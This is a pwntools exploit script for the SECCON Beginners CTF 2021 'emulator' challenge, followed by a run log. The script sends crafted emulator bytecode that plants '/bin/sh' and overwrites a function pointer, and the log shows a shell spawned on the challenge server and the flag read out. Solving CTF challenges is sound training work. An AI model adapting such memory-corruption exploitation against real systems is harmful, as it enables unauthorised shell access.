from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './chall'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "emulator.quals.beginners.seccon.jp"
  PORT = 4100
  s = remote(HOST, PORT)
  #libc = ELF("./libc-2.27.so")
else:
  s = process(BINARY)
  #s = process(BINARY, env={'LD_PRELOAD': './libc-2.23.so'})
  libc = elf.libc

s.recvuntil("loading to memory...\n")
buf = "\x3e/\x06b\x0ei\x16n\x1e/\x2eh\x26s"
buf += "\x00"*(16376 - len(buf))
buf += p64(0x4010d0)+"\xc9"
s.sendline(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/SECCON_Beginners_CTF_2021/Pwn_2021_emulator/2021_emulator$ python solve.py r
[*] '/home/mito/CTF/SECCON_Beginners_CTF_2021/Pwn_2021_emulator/2021_emulator/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to emulator.quals.beginners.seccon.jp on port 4100: Done
[*] Switching to interactive mode
running emulator...
$ id
uid=999(pwn) gid=999(pwn) groups=999(pwn)
$ ls -l
total 36
-rw-r--r-- 1 root pwn  1280 May 21 01:47 banner.txt
-r-xr-x--- 1 root pwn 21920 May 21 01:47 chall
-r--r----- 1 root pwn    32 May 21 01:47 flag.txt
-r-xr-x--- 1 root pwn    36 May 21 01:47 redir.sh
$ cat flag.txt
ctf4b{Y0u_35c4p3d_fr0m_3mul4t0r}
'''
